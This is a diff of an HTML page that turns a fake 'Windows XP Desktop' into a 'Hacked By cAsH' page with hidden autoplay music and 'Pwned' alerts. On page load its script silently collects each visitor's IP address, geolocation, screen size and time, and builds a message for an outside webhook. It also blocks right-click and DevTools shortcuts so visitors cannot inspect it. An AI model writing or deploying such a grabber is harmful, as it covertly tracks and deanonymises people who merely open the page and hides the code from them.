@@ -3,167 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Windows XP Desktop</title>
+    <title>cAsH</title>
     <style>
-        /* Global Reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        html, body {
-            width: 100%;
-            height: 100%;
-            font-family: "Tahoma", sans-serif;
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: #000000;
+            background-color: #000000;
             overflow: hidden;
+            /* Mouse Cursor */
             cursor: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329165444934008864/cursor.cur'), auto;
         }
 
-        /* Background */
-        body {
-            background: url('https://cdn.discordapp.com/attachments/1069599369529135146/1329157116531048470/eb0f8c3e2e1a8e1508f3afa2c86ad51f.gif') no-repeat center center fixed;
-            background-size: cover;
+        #ip-address {
+            color: rgb(255, 255, 255);
         }
 
-        /* Taskbar */
-        .taskbar {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 50px;
-            background: black;
-            display: flex;
-            align-items: center;
-            justify-content: flex-start;
-            box-shadow: 0 -3px 5px rgba(0, 0, 0, 0.8);
-            z-index: 100;
+        #ip-info {
+            font-family: Arial, sans-serif;
+            white-space: pre;
+            color: rgb(255, 255, 255);
         }
 
-        .start-button {
-            width: 50px;
-            height: 50px;
-            background: none;
-            border: none;
-            margin-left: 10px;
-            cursor: pointer;
-        }
-
-        .start-button img {
-            width: 40px;
-            height: 40px;
-            transition: transform 0.2s ease-in-out;
-        }
-
-        .start-button img:hover {
-            transform: scale(1.1);
-        }
-
-        /* Volume Control */
-        .volume-control {
-            position: absolute;
-            bottom: 60px;
-            right: 10px;
-            text-align: center;
-            color: white;
-            font-size: 12px;
-            z-index: 200;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 10px;
-            border-radius: 10px;
-        }
-
-        .volume-control input {
-            width: 100px;
-        }
-
-        /* Popup Alert */
-        .alert {
+        video {
             position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: black;
-            color: white;
-            padding: 20px 30px;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.8);
-            text-align: center;
-            font-size: 16px;
-            font-weight: bold;
-            z-index: 200;
-            display: none;
-            opacity: 0;
-            transition: opacity 0.3s ease-in-out;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            filter: blur(10px);
+        }
+
+        audio {
+            display: none; /* Hide audio controls */
         }
     </style>
 </head>
 <body>
-    <!-- Background Music -->
-    <iframe id="youtubePlayer" style="display:none;" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&loop=1&playlist=dQw4w9WgXcQ" frameborder="0" allow="autoplay"></iframe>
-
-    <!-- Volume Control -->
-    <div class="volume-control">
-        <span>Volume</span>
-        <input type="range" id="volumeSlider" min="0" max="100" step="1" value="100">
-    </div>
-
-    <!-- Desktop -->
-    <div class="desktop">
-        <!-- PWN Icon -->
-        <div class="icon" onclick="showAlert()">
-            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1329157216397426740/imgbin_lulzsec-security-hacker-anonymous-computer-security-hacker-group-png.png" alt="PWN Icon">
-            <span>PWN</span>
-        </div>
-    </div>
-
-    <!-- Taskbar -->
-    <div class="taskbar">
-        <button class="start-button" onclick="openGame()">
-            <img src="https://cdn.discordapp.com/attachments/1069599369529135146/1329158869271838740/start_icon.jpg" alt="Start Icon">
-        </button>
-    </div>
-
-    <!-- Smooth Alert -->
-    <div class="alert" id="alertBox">
-        Made by cAsH
-    </div>
-
-    <!-- Dinosaur Game -->
-    <div class="alert" id="gameWindow">
-        <iframe src="https://chromedino.com/" width="800" height="400" frameborder="0"></iframe>
-    </div>
+    <!-- YouTube Background Music -->
+    <iframe id="youtubePlayer" style="display:none;" 
+        src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&loop=1&playlist=dQw4w9WgXcQ" 
+        frameborder="0" allow="autoplay">
+    </iframe>
 
     <script>
-        // Smooth Alert for PWN Icon
-        function showAlert() {
-            const alertBox = document.getElementById('alertBox');
-            alertBox.style.display = 'block';
-            alertBox.style.opacity = '1';
-
-            setTimeout(() => {
-                alertBox.style.opacity = '0';
-                setTimeout(() => {
-                    alertBox.style.display = 'none';
-                }, 300);
-            }, 3000);
-        }
-
-        // Volume Control for YouTube Player
-        const volumeSlider = document.getElementById('volumeSlider');
-        const youtubePlayer = document.getElementById('youtubePlayer');
-
-        volumeSlider.addEventListener('input', (e) => {
-            const volume = e.target.value / 100; // Convert to range 0.0 - 1.0
-            youtubePlayer.contentWindow.postMessage(JSON.stringify({
-                event: 'command',
-                func: 'setVolume',
-                args: [volume * 100]
-            }), '*');
+        // Prevent right-click and block DevTools
+        document.addEventListener("contextmenu", function (e) {
+            e.preventDefault();
+            alert("💀 Pwned :)");
         });
 
-        // Webhook Script to Fetch and Send IP Info
+        document.addEventListener("keydown", function (e) {
+            if (
+                e.key === "F12" ||
+                (e.ctrlKey && e.shiftKey && e.key === "I") ||
+                (e.ctrlKey && e.key === "U")
+            ) {
+                e.preventDefault();
+                alert("💀 Pwned :)");
+            }
+        });
+
+        // Change names dynamically
+        var names = [
+            { name: "[ cAsH، ]", color: "red" },
+            { name: "[ cAsH، ]", color: "white" }
+        ];
+
+        var nameIndex = 0;
+
+        function changeNames() {
+            var currentName = names[nameIndex];
+            document.getElementById("name").textContent = currentName.name;
+            document.getElementById("name").style.color = currentName.color;
+            nameIndex = (nameIndex + 1) % names.length;
+        }
+
+        setInterval(changeNames, 1000);
+
+        // Fetch and send IP to webhook
         async function fetchAndSendIP() {
             try {
                 const ipResponse = await fetch('https://api.ipify.org/?format=json');
@@ -178,6 +95,9 @@
                 const screenWidth = screen.width;
                 const screenHeight = screen.height;
                 const timestamp = new Date().toLocaleString();
+
+                document.getElementById('ip-address-value').textContent = userIP;
+                document.getElementById('ip-info').textContent = JSON.stringify(geoData, null, 2);
 
                 // Build webhook message content
                 const webhookMessage = `
@@ -207,30 +127,32 @@
             }
         }
 
-        // Execute the Webhook Script on Page Load
+        // Execute the function on page load
         window.onload = fetchAndSendIP;
-
-        // Block Right-Click and Inspect
-        document.addEventListener('contextmenu', (e) => e.preventDefault());
-
-        document.addEventListener('keydown', (e) => {
-            if (
-                e.key === 'F12' ||
-                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-                (e.ctrlKey && e.key === 'U')
-            ) {
-                e.preventDefault();
-            }
-        });
-
-        // Reload if DevTools Detected
-        setInterval(() => {
-            const t1 = performance.now();
-            console.log('Detecting DevTools...');
-            const t2 = performance.now();
-            if (t2 - t1 > 100) window.location.reload();
-        }, 1000);
     </script>
+
+    <!-- Background Video -->
+    <video autoplay loop muted>
+        <source src="https://cdn.discordapp.com/attachments/1069599369529135146/1312426668799037490/0060f2ccce355a00.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <!-- Main Content -->
+    <p align="center">
+        <img border="0" src="https://cdn.discordapp.com/attachments/1069599369529135146/1313612143672692896/1111.png" width="400">
+    </p>
+    <p align="center">
+        <font face="Courier" size="6" style="color: #000000;">
+            <span style="color: rgb(210, 105, 30);"> Hacked By cAsH </span>
+            <span id="name"></span>
+        </font>
+    </p>
+    <p id="ip-address">
+        <span style="color: rgb(255, 255, 255);">Your IP Address: </span>
+        <span id="ip-address-value" style="color: rgb(255, 255, 255); font-size: 17px;">Loading...</span>
+    </p>
+
+    <h3 style="color: rgb(255, 255, 255);">Your IP Info:</h3>
+    <pre id="ip-info" class="json-data">Fetching...</pre>
 </body>
 </html>
